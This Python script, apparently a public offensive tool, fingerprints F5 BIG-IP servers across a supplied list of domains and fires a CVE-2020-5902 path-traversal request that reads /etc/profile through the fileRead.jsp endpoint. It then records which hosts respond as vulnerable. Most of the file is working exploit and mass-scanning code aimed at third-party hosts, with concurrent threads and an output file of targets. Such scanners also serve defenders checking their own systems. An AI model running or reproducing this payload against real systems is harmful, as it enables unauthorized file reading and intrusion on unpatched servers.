import argparse, re, requests, concurrent.futures, sys, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def detect(url, heads):
	try:
		req = requests.head(url, headers=heads, verify=False, timeout=60)
		headers = req.headers
	except:
		return False
	# Schema regex taken from whatwaf: https://github.com/Ekultek/WhatWaf/blob/master/content/plugins/bigip.py
	detection_schema = (
		re.compile(r"\ATS\w{4,}=", re.I), re.compile(r"bigipserver(.i)?|bigipserverinternal", re.I), re.compile(r"\AF5\Z", re.I),
		re.compile(r"^TS[a-zA-Z0-9]{3,8}=", re.I), re.compile(r"BigIP|BIG-IP|BIGIP"), re.compile(r"bigipserver", re.I)
	)
	for detection in detection_schema:
		if (detection.search(headers.get("Server", "")) is not None) or\
			(detection.search(headers.get("Set-Cookie", "")) is not None) or\
			(detection.search(headers.get("Cookie", "")) is not None):
			return True

def Big_man(url, heads): # Yup nice function name :"D
	result = {}
	if detect(url, heads):
		result["url"]        = url
		result["Vulnerable"] = False
		try:
			req = requests.get(url+'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile', headers=heads, verify=False, timeout=60)
			if req.status_code==200 or ('System wide environment and startup programs' in req.text):
				result["Vulnerable"] = True
		except requests.exceptions.RequestException:
			pass
		except Exception as e:
			print(e)
	######################
	return result

class color:
	reset     = '\033[0m'
	green     = reset + '\033[32m'
	blue      = reset + '\033[94m'
	red       = reset + '\033[31m'
	white     = reset + '\x1b[37m'
	magneta   = reset + '\x1b[35m'
	cyan      = reset + '\x1b[36m'
	Bold      = "\033[1m"
	underline = "\033[4m"

def main( args):
	try:
		f = open(args.Domains_file)
		domains = f.read().splitlines()
		f.close()
	except:
		print(color.red+" [!] Can't read file!")
		exit(1)

	headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
	if args.headers:
		for line in args.headers.split("\n"):
			if ":" not in line:
				print(color.red+" [!] Invalid headers! headers should be at the form (name:value) seperated by \\n.")
				exit(1)
			else:
				headers.update({line.split(":")[0]:line.split(":")[1]})

	sys.stdout.write(f"{color.green}[+]{color.reset} Loaded {len(domains)} domain(s)\n")
	sys.stdout.flush()
	total = []
	number,futures = 0,[]
	with concurrent.futures.ThreadPoolExecutor(max_workers=len(domains)) as executor:
		start = time.time()
		for d in domains:
			number +=1
			sys.stdout.write("\r | Launching concurrent detectors {:10}".format("({}/{})".format( number,len(domains) )) )
			sys.stdout.flush()
			url = d
			if not url.startswith("http"):
				url = "http://"+url
			if url.endswith("/"):
				url = url[:-1]
			futures.append( executor.submit(Big_man, url, headers))
			time.sleep(0.01)
		sys.stdout.write("\r | Waiting for result(s) from detectors.....")
		sys.stdout.flush()
		number
		for site in concurrent.futures.as_completed(futures, timeout=(60*10)):
			domain_result = site.result()
			if domain_result:
				sys.stdout.write("\n | {}\t{}".format(
					domain_result["url"],
					{
						True :f"{color.green}[  Vulnerable  ]{color.reset}",
						False:f"{color.red}[Not vulnerable]{color.reset}"
					}[domain_result["Vulnerable"]]
					)
				)
				sys.stdout.flush()
				if domain_result["Vulnerable"]:
					total.append(domain_result["url"])
			else:
				sys.stdout.write("\r | Waiting for result(s) from detectors.. (Progress: {:.2f}%)".format((number/len(domains))*100) )
				sys.stdout.flush()

	sys.stdout.write(f"\n{color.blue} |{color.reset} Total elapsed time {time.strftime('%M.%Sm', time.gmtime(time.time()-start))}.\n")
	sys.stdout.flush()
	if args.o and type(args.o) is str and total:
		try:
			f = open(args.o,"w")
			for line in total:
				f.write(line+"\n")
			f.close()
			print(f"\n{color.blue}[i]{color.reset} Written results to {args.o}")
		except:
			print(f"{color.red} [!] Can't write to {args.o}!")

if __name__ == '__main__':
	parser = argparse.ArgumentParser(prog='BigIP_scanner.py')
	parser.add_argument("Domains_file", help="File of domains file to work with")
	parser.add_argument("--headers", help="Headers you want to add to requests(ex: 'Host: 127.0.0.1')")
	parser.add_argument("-o", help="Output the vulnerable domains to a file.")
	args = parser.parse_args()
	print(f"{color.Bold} BigIP Scanner - Scan for BIG-IP F5 servers in a given list and check them against CVE-2020-5902{color.reset}")
	print(f"{color.blue}{color.Bold}\tBy: Karim 'D4Vinci' Shoair{color.reset}")
	main(args)
